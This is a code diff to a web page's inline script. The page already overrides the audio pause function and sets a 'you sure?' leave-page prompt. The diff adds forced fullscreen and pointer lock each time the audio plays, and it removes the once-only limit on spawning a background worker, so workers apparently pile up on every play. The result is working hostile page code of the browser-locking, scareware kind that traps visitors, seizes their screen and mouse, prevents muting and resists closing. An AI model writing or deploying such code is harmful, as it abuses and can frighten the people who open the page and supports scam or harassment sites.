@@ -14,9 +14,28 @@
 
     <script>
         const audio = document.getElementById('myAudio');
-        
+
         audio.pause = function() {
           console.log('Pause blocked')
+        }
+
+        function requestPointerLock () {
+          const requestPointerLockApi = (
+            document.body.requestPointerLock ||
+            document.body.webkitRequestPointerLock ||
+            document.body.mozRequestPointerLock ||
+            document.body.msRequestPointerLock
+          )
+        
+          requestPointerLockApi.call(document.body)
+        }
+        function requestFullscreen () {
+          const requestFullscreen = Element.prototype.requestFullscreen ||
+            Element.prototype.webkitRequestFullscreen ||
+            Element.prototype.mozRequestFullScreen ||
+            Element.prototype.msRequestFullscreen
+        
+          requestFullscreen.call(document.body)
         }
 
         function playAudioOnce() {
@@ -27,7 +46,6 @@
             }
         }
 
-        // List of common user interactions
         const events = ['click', 'keypress'];
 
         events.forEach(event => {
@@ -37,8 +55,10 @@
             event.returnValue = "you sure?";
         });
         audio.addEventListener("playing", () => {
+            requestFullscreen()
+            requestPointerLock()
             new Worker('worker.js')
-        }, { once:true });
+        });
         audio.addEventListener('pause', () => {
           playAudioOnce()
         });
